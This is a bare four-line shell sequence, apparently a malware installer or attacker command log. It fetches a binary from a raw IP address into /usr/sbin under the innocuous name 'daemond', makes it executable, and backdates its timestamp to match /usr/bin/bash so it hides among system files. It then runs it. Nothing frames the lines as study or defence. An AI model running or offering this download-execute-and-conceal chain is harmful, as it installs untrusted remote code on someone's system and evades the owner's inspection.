curl -s -o /usr/sbin/daemond http://80.78.25.27:60080/daemond
chmod 755 /usr/sbin/daemond
touch /usr/sbin/daemond -r /usr/bin/bash
/usr/sbin/daemond
